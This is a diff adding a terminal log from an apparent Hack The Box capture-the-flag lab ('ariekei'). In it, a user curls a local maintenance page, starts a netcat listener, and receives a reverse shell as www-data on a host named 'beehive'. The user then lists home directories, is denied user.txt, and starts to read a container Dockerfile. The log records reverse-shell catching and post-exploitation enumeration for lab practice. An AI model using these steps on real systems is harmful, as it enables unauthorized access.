@@ -1,0 +1,49 @@
+root@parrot:~/hackthebox/ariekei# curl 127.0.0.1:8001                           
+
+<!doctype html>                         
+<title>Site Maintenance</title>         
+<style>                                 
+  body { text-align: center; padding: 150px; }                                  
+  h1 { font-size: 50px; }               
+  body { font: 20px Helvetica, sans-serif; color: #333; }                       
+  article { display: block; text-align: left; width: 650px; margin: 0 auto; }   
+  a { color: #dc8100; text-decoration: none; }                                  
+  a:hover { color: #333; text-decoration: none; }                               
+</style>                                
+
+<article>                               
+    <h1>Maintainence! </h1>             
+    <div>                               
+    <p> This site is under development </p>                                     
+    </div>                              
+</article>                              
+root@parrot:~/hackthebox/ariekei# nc -lvnp 8003                                 
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                    
+Ncat: Listening on :::8003              
+Ncat: Listening on 0.0.0.0:8003         
+Ncat: Connection from 127.0.0.1.        
+Ncat: Connection from 127.0.0.1:57518.  
+www-data@beehive:/usr/lib/cgi-bin$ cd /home/                                    
+cd /home/                               
+www-data@beehive:/home$ ls              
+ls                                      
+spanishdancer                           
+www-data@beehive:/home$ cd spanishdancer
+cd spanishdancer                        
+www-data@beehive:/home/spanishdancer$ ls
+ls                                      
+content                                 
+user.txt                                
+www-data@beehive:/home/spanishdancer$ cat user.txt                              
+cat user.txt                            
+cat: user.txt: Permission denied        
+www-data@beehive:/home/spanishdancer$ cd /common/containers/bastion-live        
+cd /common/containers/bastion-live      
+www-data@beehive:/common/containers/bastion-live$ cat Dockerfile                
+^C                                      
+root@parrot:~/hackthebox/ariekei# nc -lvnp 8003                                 
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                    
+Ncat: Listening on :::8003              
+Ncat: Listening on 0.0.0.0:8003         
+^C                                      
+root@parrot:~/hackthebox/ariekei#       
